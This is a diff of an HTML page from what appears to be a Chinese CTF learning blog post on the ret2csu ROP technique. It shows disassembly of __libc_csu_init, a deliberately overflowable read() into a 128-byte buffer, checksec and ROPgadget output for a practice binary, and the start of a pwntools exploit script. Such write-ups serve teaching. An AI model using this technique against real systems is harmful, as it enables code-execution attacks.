+</span><span class=lnt id=hl-7-16><a class=lnlinks href=#hl-7-16>16</a>
+</span><span class=lnt id=hl-7-17><a class=lnlinks href=#hl-7-17>17</a>
+</span><span class=lnt id=hl-7-18><a class=lnlinks href=#hl-7-18>18</a>
+</span><span class=lnt id=hl-7-19><a class=lnlinks href=#hl-7-19>19</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↑j
+</span></span><span class=line><span class=cl>.text:0000000000400600                 mov     rdx, r13
+</span></span><span class=line><span class=cl>.text:0000000000400603                 mov     rsi, r14
+</span></span><span class=line><span class=cl>.text:0000000000400606                 mov     edi, r15d
+</span></span><span class=line><span class=cl>.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+</span></span><span class=line><span class=cl>.text:000000000040060D                 add     rbx, 1
+</span></span><span class=line><span class=cl>.text:0000000000400611                 cmp     rbx, rbp
+</span></span><span class=line><span class=cl>.text:0000000000400614                 jnz     short loc_400600
+</span></span><span class=line><span class=cl>.text:0000000000400616
+</span></span><span class=line><span class=cl>.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
+</span></span><span class=line><span class=cl>.text:0000000000400616                 add     rsp, 8
+</span></span><span class=line><span class=cl>.text:000000000040061A                 pop     rbx
+</span></span><span class=line><span class=cl>.text:000000000040061B                 pop     rbp
+</span></span><span class=line><span class=cl>.text:000000000040061C                 pop     r12
+</span></span><span class=line><span class=cl>.text:000000000040061E                 pop     r13
+</span></span><span class=line><span class=cl>.text:0000000000400620                 pop     r14
+</span></span><span class=line><span class=cl>.text:0000000000400622                 pop     r15
+</span></span><span class=line><span class=cl>.text:0000000000400624                 retn
+</span></span><span class=line><span class=cl>.text:0000000000400624 __libc_csu_init endp</span></span></code></pre></td></tr></table></div></div><p>但是我们可能遇到 mov 进行控制（本题）, ctfwiki 中 csu_end_addr 指向的是 pop rbx, 但是 mov 形式的 <code>add rsp, 8</code> 这部分被合并后面的部分，导致我们没法跳过</p><p>实战要灵活变通</p><h2 id=攻克题目>攻克题目
+<a class=header-anchor href=#%e6%94%bb%e5%85%8b%e9%a2%98%e7%9b%ae></a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1>1</a>
+</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2>2</a>
+</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3>3</a>
+</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4>4</a>
+</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5>5</a>
+</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6>6</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
 </span></span><span class=line><span class=cl><span class=p>{</span>
 </span></span><span class=line><span class=cl>  <span class=n>_BYTE</span> <span class=n>buf</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-80h] BYREF
 </span></span></span><span class=line><span class=cl><span class=c1></span>
 </span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x200u</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>栈溢出 + 格式化字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
-</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
-</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3>3</a>
-</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4>4</a>
-</span><span class=lnt id=hl-6-5><a class=lnlinks href=#hl-6-5>5</a>
-</span><span class=lnt id=hl-6-6><a class=lnlinks href=#hl-6-6>6</a>
-</span><span class=lnt id=hl-6-7><a class=lnlinks href=#hl-6-7>7</a>
-</span><span class=lnt id=hl-6-8><a class=lnlinks href=#hl-6-8>8</a>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>栈溢出 + 格式化字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1>1</a>
+</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2>2</a>
+</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3>3</a>
+</span><span class=lnt id=hl-9-4><a class=lnlinks href=#hl-9-4>4</a>
+</span><span class=lnt id=hl-9-5><a class=lnlinks href=#hl-9-5>5</a>
+</span><span class=lnt id=hl-9-6><a class=lnlinks href=#hl-9-6>6</a>
+</span><span class=lnt id=hl-9-7><a class=lnlinks href=#hl-9-7>7</a>
+</span><span class=lnt id=hl-9-8><a class=lnlinks href=#hl-9-8>8</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/R/linux_x64 ❯❯❯ pwn checksec ./level5                                                                                                                     <span class=o>(</span>.venv<span class=o>)</span> master
 </span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ROP_STEP_BY_STEP/linux_x64/level5&#39;</span>
 </span></span><span class=line><span class=cl>    Arch:       amd64-64-little
@@ -266,15 +344,15 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 </span></span><span class=line><span class=cl>    Stack:      No canary found
 </span></span><span class=line><span class=cl>    NX:         NX enabled
 </span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x400000<span class=o>)</span>
-</span></span><span class=line><span class=cl>    Stripped:   No</span></span></code></pre></td></tr></table></div></div><p>64 位，无 cancary</p><p>查找 gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1>1</a>
-</span><span class=lnt id=hl-7-2><a class=lnlinks href=#hl-7-2>2</a>
-</span><span class=lnt id=hl-7-3><a class=lnlinks href=#hl-7-3>3</a>
-</span><span class=lnt id=hl-7-4><a class=lnlinks href=#hl-7-4>4</a>
-</span><span class=lnt id=hl-7-5><a class=lnlinks href=#hl-7-5>5</a>
-</span><span class=lnt id=hl-7-6><a class=lnlinks href=#hl-7-6>6</a>
-</span><span class=lnt id=hl-7-7><a class=lnlinks href=#hl-7-7>7</a>
-</span><span class=lnt id=hl-7-8><a class=lnlinks href=#hl-7-8>8</a>
-</span><span class=lnt id=hl-7-9><a class=lnlinks href=#hl-7-9>9</a>
+</span></span><span class=line><span class=cl>    Stripped:   No</span></span></code></pre></td></tr></table></div></div><p>64 位，无 cancary</p><p>查找 gadget</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1>1</a>
+</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2>2</a>
+</span><span class=lnt id=hl-10-3><a class=lnlinks href=#hl-10-3>3</a>
+</span><span class=lnt id=hl-10-4><a class=lnlinks href=#hl-10-4>4</a>
+</span><span class=lnt id=hl-10-5><a class=lnlinks href=#hl-10-5>5</a>
+</span><span class=lnt id=hl-10-6><a class=lnlinks href=#hl-10-6>6</a>
+</span><span class=lnt id=hl-10-7><a class=lnlinks href=#hl-10-7>7</a>
+</span><span class=lnt id=hl-10-8><a class=lnlinks href=#hl-10-8>8</a>
+</span><span class=lnt id=hl-10-9><a class=lnlinks href=#hl-10-9>9</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/R/linux_x64 ❯❯❯ ROPgadget --binary ./level5 --only <span class=s2>&#34;pop|ret&#34;</span>                                                                                            <span class=o>(</span>.venv<span class=o>)</span> master ◼
 </span></span><span class=line><span class=cl>Gadgets <span class=nv>information</span>
 </span></span><span class=line><span class=cl><span class=o>============================================================</span>
@@ -283,74 +361,74 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 </span></span><span class=line><span class=cl>0x0000000000400417 : ret
 </span></span><span class=line><span class=cl>0x0000000000400442 : ret 0x200b
 </span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Unique gadgets found: <span class=m>4</span></span></span></code></pre></td></tr></table></div></div><p>很少没法传参, 使用 csu</p><p>payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1> 1</a>
-</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2> 2</a>
-</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3> 3</a>
-</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4> 4</a>
-</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5> 5</a>
-</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6> 6</a>
-</span><span class=lnt id=hl-8-7><a class=lnlinks href=#hl-8-7> 7</a>
-</span><span class=lnt id=hl-8-8><a class=lnlinks href=#hl-8-8> 8</a>
-</span><span class=lnt id=hl-8-9><a class=lnlinks href=#hl-8-9> 9</a>
-</span><span class=lnt id=hl-8-10><a class=lnlinks href=#hl-8-10>10</a>
-</span><span class=lnt id=hl-8-11><a class=lnlinks href=#hl-8-11>11</a>
-</span><span class=lnt id=hl-8-12><a class=lnlinks href=#hl-8-12>12</a>
-</span><span class=lnt id=hl-8-13><a class=lnlinks href=#hl-8-13>13</a>
-</span><span class=lnt id=hl-8-14><a class=lnlinks href=#hl-8-14>14</a>
-</span><span class=lnt id=hl-8-15><a class=lnlinks href=#hl-8-15>15</a>
-</span><span class=lnt id=hl-8-16><a class=lnlinks href=#hl-8-16>16</a>
-</span><span class=lnt id=hl-8-17><a class=lnlinks href=#hl-8-17>17</a>
-</span><span class=lnt id=hl-8-18><a class=lnlinks href=#hl-8-18>18</a>
-</span><span class=lnt id=hl-8-19><a class=lnlinks href=#hl-8-19>19</a>
-</span><span class=lnt id=hl-8-20><a class=lnlinks href=#hl-8-20>20</a>
-</span><span class=lnt id=hl-8-21><a class=lnlinks href=#hl-8-21>21</a>
-</span><span class=lnt id=hl-8-22><a class=lnlinks href=#hl-8-22>22</a>
-</span><span class=lnt id=hl-8-23><a class=lnlinks href=#hl-8-23>23</a>
-</span><span class=lnt id=hl-8-24><a class=lnlinks href=#hl-8-24>24</a>
-</span><span class=lnt id=hl-8-25><a class=lnlinks href=#hl-8-25>25</a>
-</span><span class=lnt id=hl-8-26><a class=lnlinks href=#hl-8-26>26</a>
-</span><span class=lnt id=hl-8-27><a class=lnlinks href=#hl-8-27>27</a>
-</span><span class=lnt id=hl-8-28><a class=lnlinks href=#hl-8-28>28</a>
-</span><span class=lnt id=hl-8-29><a class=lnlinks href=#hl-8-29>29</a>
-</span><span class=lnt id=hl-8-30><a class=lnlinks href=#hl-8-30>30</a>
-</span><span class=lnt id=hl-8-31><a class=lnlinks href=#hl-8-31>31</a>
-</span><span class=lnt id=hl-8-32><a class=lnlinks href=#hl-8-32>32</a>
-</span><span class=lnt id=hl-8-33><a class=lnlinks href=#hl-8-33>33</a>
-</span><span class=lnt id=hl-8-34><a class=lnlinks href=#hl-8-34>34</a>
-</span><span class=lnt id=hl-8-35><a class=lnlinks href=#hl-8-35>35</a>
-</span><span class=lnt id=hl-8-36><a class=lnlinks href=#hl-8-36>36</a>
-</span><span class=lnt id=hl-8-37><a class=lnlinks href=#hl-8-37>37</a>
-</span><span class=lnt id=hl-8-38><a class=lnlinks href=#hl-8-38>38</a>
-</span><span class=lnt id=hl-8-39><a class=lnlinks href=#hl-8-39>39</a>
-</span><span class=lnt id=hl-8-40><a class=lnlinks href=#hl-8-40>40</a>
-</span><span class=lnt id=hl-8-41><a class=lnlinks href=#hl-8-41>41</a>
-</span><span class=lnt id=hl-8-42><a class=lnlinks href=#hl-8-42>42</a>
-</span><span class=lnt id=hl-8-43><a class=lnlinks href=#hl-8-43>43</a>
-</span><span class=lnt id=hl-8-44><a class=lnlinks href=#hl-8-44>44</a>
-</span><span class=lnt id=hl-8-45><a class=lnlinks href=#hl-8-45>45</a>
-</span><span class=lnt id=hl-8-46><a class=lnlinks href=#hl-8-46>46</a>
-</span><span class=lnt id=hl-8-47><a class=lnlinks href=#hl-8-47>47</a>
-</span><span class=lnt id=hl-8-48><a class=lnlinks href=#hl-8-48>48</a>
-</span><span class=lnt id=hl-8-49><a class=lnlinks href=#hl-8-49>49</a>
-</span><span class=lnt id=hl-8-50><a class=lnlinks href=#hl-8-50>50</a>
-</span><span class=lnt id=hl-8-51><a class=lnlinks href=#hl-8-51>51</a>
-</span><span class=lnt id=hl-8-52><a class=lnlinks href=#hl-8-52>52</a>
-</span><span class=lnt id=hl-8-53><a class=lnlinks href=#hl-8-53>53</a>
-</span><span class=lnt id=hl-8-54><a class=lnlinks href=#hl-8-54>54</a>
-</span><span class=lnt id=hl-8-55><a class=lnlinks href=#hl-8-55>55</a>
-</span><span class=lnt id=hl-8-56><a class=lnlinks href=#hl-8-56>56</a>
-</span><span class=lnt id=hl-8-57><a class=lnlinks href=#hl-8-57>57</a>
-</span><span class=lnt id=hl-8-58><a class=lnlinks href=#hl-8-58>58</a>
-</span><span class=lnt id=hl-8-59><a class=lnlinks href=#hl-8-59>59</a>
-</span><span class=lnt id=hl-8-60><a class=lnlinks href=#hl-8-60>60</a>
-</span><span class=lnt id=hl-8-61><a class=lnlinks href=#hl-8-61>61</a>
-</span><span class=lnt id=hl-8-62><a class=lnlinks href=#hl-8-62>62</a>
-</span><span class=lnt id=hl-8-63><a class=lnlinks href=#hl-8-63>63</a>
-</span><span class=lnt id=hl-8-64><a class=lnlinks href=#hl-8-64>64</a>
-</span><span class=lnt id=hl-8-65><a class=lnlinks href=#hl-8-65>65</a>
-</span><span class=lnt id=hl-8-66><a class=lnlinks href=#hl-8-66>66</a>
-</span><span class=lnt id=hl-8-67><a class=lnlinks href=#hl-8-67>67</a>
-</span><span class=lnt id=hl-8-68><a class=lnlinks href=#hl-8-68>68</a>
+</span></span><span class=line><span class=cl>Unique gadgets found: <span class=m>4</span></span></span></code></pre></td></tr></table></div></div><p>很少没法传参, 使用 csu</p><p>payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1> 1</a>
+</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2> 2</a>
+</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3> 3</a>
+</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4> 4</a>
+</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5> 5</a>
+</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6> 6</a>
+</span><span class=lnt id=hl-11-7><a class=lnlinks href=#hl-11-7> 7</a>
+</span><span class=lnt id=hl-11-8><a class=lnlinks href=#hl-11-8> 8</a>
+</span><span class=lnt id=hl-11-9><a class=lnlinks href=#hl-11-9> 9</a>
+</span><span class=lnt id=hl-11-10><a class=lnlinks href=#hl-11-10>10</a>
+</span><span class=lnt id=hl-11-11><a class=lnlinks href=#hl-11-11>11</a>
+</span><span class=lnt id=hl-11-12><a class=lnlinks href=#hl-11-12>12</a>
+</span><span class=lnt id=hl-11-13><a class=lnlinks href=#hl-11-13>13</a>
+</span><span class=lnt id=hl-11-14><a class=lnlinks href=#hl-11-14>14</a>
+</span><span class=lnt id=hl-11-15><a class=lnlinks href=#hl-11-15>15</a>
+</span><span class=lnt id=hl-11-16><a class=lnlinks href=#hl-11-16>16</a>
+</span><span class=lnt id=hl-11-17><a class=lnlinks href=#hl-11-17>17</a>
+</span><span class=lnt id=hl-11-18><a class=lnlinks href=#hl-11-18>18</a>
+</span><span class=lnt id=hl-11-19><a class=lnlinks href=#hl-11-19>19</a>
+</span><span class=lnt id=hl-11-20><a class=lnlinks href=#hl-11-20>20</a>
+</span><span class=lnt id=hl-11-21><a class=lnlinks href=#hl-11-21>21</a>
+</span><span class=lnt id=hl-11-22><a class=lnlinks href=#hl-11-22>22</a>
+</span><span class=lnt id=hl-11-23><a class=lnlinks href=#hl-11-23>23</a>
+</span><span class=lnt id=hl-11-24><a class=lnlinks href=#hl-11-24>24</a>
+</span><span class=lnt id=hl-11-25><a class=lnlinks href=#hl-11-25>25</a>
+</span><span class=lnt id=hl-11-26><a class=lnlinks href=#hl-11-26>26</a>
+</span><span class=lnt id=hl-11-27><a class=lnlinks href=#hl-11-27>27</a>
+</span><span class=lnt id=hl-11-28><a class=lnlinks href=#hl-11-28>28</a>
+</span><span class=lnt id=hl-11-29><a class=lnlinks href=#hl-11-29>29</a>
+</span><span class=lnt id=hl-11-30><a class=lnlinks href=#hl-11-30>30</a>
+</span><span class=lnt id=hl-11-31><a class=lnlinks href=#hl-11-31>31</a>
+</span><span class=lnt id=hl-11-32><a class=lnlinks href=#hl-11-32>32</a>
+</span><span class=lnt id=hl-11-33><a class=lnlinks href=#hl-11-33>33</a>
+</span><span class=lnt id=hl-11-34><a class=lnlinks href=#hl-11-34>34</a>
+</span><span class=lnt id=hl-11-35><a class=lnlinks href=#hl-11-35>35</a>
+</span><span class=lnt id=hl-11-36><a class=lnlinks href=#hl-11-36>36</a>
+</span><span class=lnt id=hl-11-37><a class=lnlinks href=#hl-11-37>37</a>
+</span><span class=lnt id=hl-11-38><a class=lnlinks href=#hl-11-38>38</a>
+</span><span class=lnt id=hl-11-39><a class=lnlinks href=#hl-11-39>39</a>
+</span><span class=lnt id=hl-11-40><a class=lnlinks href=#hl-11-40>40</a>
+</span><span class=lnt id=hl-11-41><a class=lnlinks href=#hl-11-41>41</a>
+</span><span class=lnt id=hl-11-42><a class=lnlinks href=#hl-11-42>42</a>
+</span><span class=lnt id=hl-11-43><a class=lnlinks href=#hl-11-43>43</a>
+</span><span class=lnt id=hl-11-44><a class=lnlinks href=#hl-11-44>44</a>
+</span><span class=lnt id=hl-11-45><a class=lnlinks href=#hl-11-45>45</a>
+</span><span class=lnt id=hl-11-46><a class=lnlinks href=#hl-11-46>46</a>
+</span><span class=lnt id=hl-11-47><a class=lnlinks href=#hl-11-47>47</a>
+</span><span class=lnt id=hl-11-48><a class=lnlinks href=#hl-11-48>48</a>
+</span><span class=lnt id=hl-11-49><a class=lnlinks href=#hl-11-49>49</a>
+</span><span class=lnt id=hl-11-50><a class=lnlinks href=#hl-11-50>50</a>
+</span><span class=lnt id=hl-11-51><a class=lnlinks href=#hl-11-51>51</a>
+</span><span class=lnt id=hl-11-52><a class=lnlinks href=#hl-11-52>52</a>
+</span><span class=lnt id=hl-11-53><a class=lnlinks href=#hl-11-53>53</a>
+</span><span class=lnt id=hl-11-54><a class=lnlinks href=#hl-11-54>54</a>
+</span><span class=lnt id=hl-11-55><a class=lnlinks href=#hl-11-55>55</a>
+</span><span class=lnt id=hl-11-56><a class=lnlinks href=#hl-11-56>56</a>
+</span><span class=lnt id=hl-11-57><a class=lnlinks href=#hl-11-57>57</a>
+</span><span class=lnt id=hl-11-58><a class=lnlinks href=#hl-11-58>58</a>
+</span><span class=lnt id=hl-11-59><a class=lnlinks href=#hl-11-59>59</a>
+</span><span class=lnt id=hl-11-60><a class=lnlinks href=#hl-11-60>60</a>
+</span><span class=lnt id=hl-11-61><a class=lnlinks href=#hl-11-61>61</a>
+</span><span class=lnt id=hl-11-62><a class=lnlinks href=#hl-11-62>62</a>
+</span><span class=lnt id=hl-11-63><a class=lnlinks href=#hl-11-63>63</a>
+</span><span class=lnt id=hl-11-64><a class=lnlinks href=#hl-11-64>64</a>
+</span><span class=lnt id=hl-11-65><a class=lnlinks href=#hl-11-65>65</a>
+</span><span class=lnt id=hl-11-66><a class=lnlinks href=#hl-11-66>66</a>
+</span><span class=lnt id=hl-11-67><a class=lnlinks href=#hl-11-67>67</a>
+</span><span class=lnt id=hl-11-68><a class=lnlinks href=#hl-11-68>68</a>
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl>
@@ -423,8 +501,8 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.jpg alt="lhon901 - 支付宝">
 <span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.jpg alt="lhon901 - 微信">
 <span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg class=cc-icon width=75 height=75 align=right alt=共享知识 title=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
-从零开始的 Pwn 之旅 Ret2csu</li><li class=post-copyright-author><strong>本文作者： </strong>lhon901</li><li class=post-copyright-link><strong>本文链接：</strong>
-<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/ title="从零开始的 Pwn 之旅   Ret2csu">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
+从零开始的 Pwn 之旅 - Ret2csu</li><li class=post-copyright-author><strong>本文作者： </strong>lhon901</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/ title="从零开始的 Pwn 之旅 - Ret2csu">/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本作品采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans>BY-NC-SA</a> 许可协议。转载请注明出处！</li><li><div class=license-icons><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans target=_blank><img src=/imgs/cc/big/by_nc_sa.svg alt=BY-NC-SA title=BY-NC-SA>
 </a><a href=https://notbyai.fyi target=_blank><img src=/imgs/notbyai/zh-hans/.svg title="Not By AI"></a></div></li></ul></div><div class=followme><span>欢迎关注我的其它发布渠道</span><div class=social-list><div class=social-item><a target=_blank class=social-link href=/images/wechat_channel.jpg><span class=icon><i class="fab fa-weixin"></i>
 </span><span class=label>WeChat</span></a></div><div class=social-item><a target=_blank class=social-link href=/atom.xml><span class=icon><i class="fa fa-rss"></i>
 </span><span class=label>RSS</span></a></div></div></div><div class=post-nav><div class="post-nav-next post-nav-item"></div><div class="post-nav-prev post-nav-item"><a href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/ rel=prev title="从零开始的 Pwn 之旅 - 格式化字符串">从零开始的 Pwn 之旅 - 格式化字符串
@@ -434,4 +512,4 @@ ret2csu 是一个常见的 gadget，通常在使用 C++ 的程序中会有这个
 <span class=lang-name>简体中文</span></div></div></div></div><div class=copyright>&copy;
 <span itemprop=copyrightYear>2025
 </span><span class=with-love><i class="fa fa-heart"></i>
-</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/","title":"从零开始的 Pwn 之旅   Ret2csu","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"isMultiLang":true,"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"slideInRight","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","share":{"addtoany":{"js":"https://static.addtoany.com/menu/page.js","locale":"zh-CN","num":8},"enable":true},"sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"/js/3rd"}},"version":"4.8.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src="/js/main.min.js?=1752318396" defer></script><script type=text/javascript src="/js/clipboard.min.js?=1752318396" defer></script></body></html>
+</span><span class=author itemprop=copyrightHolder>© 2024 lhon901. All rights reserved.</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.146.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div></div></footer><script class=next-config data-name=page type=application/json>{"clipboard":{"js":{"alias":"clipboard","file":"dist/clipboard.min.js","name":"clipboard.js","version":"2.0.11"}},"comments":false,"expired":false,"isHome":false,"isPage":true,"path":"%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu","permalink":"/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2csu/","title":"从零开始的 Pwn 之旅 - Ret2csu","toc":true,"waline":{"commentcnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}}}</script><script type=text/javascript src=/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"/","i18n":{"ds_day":" 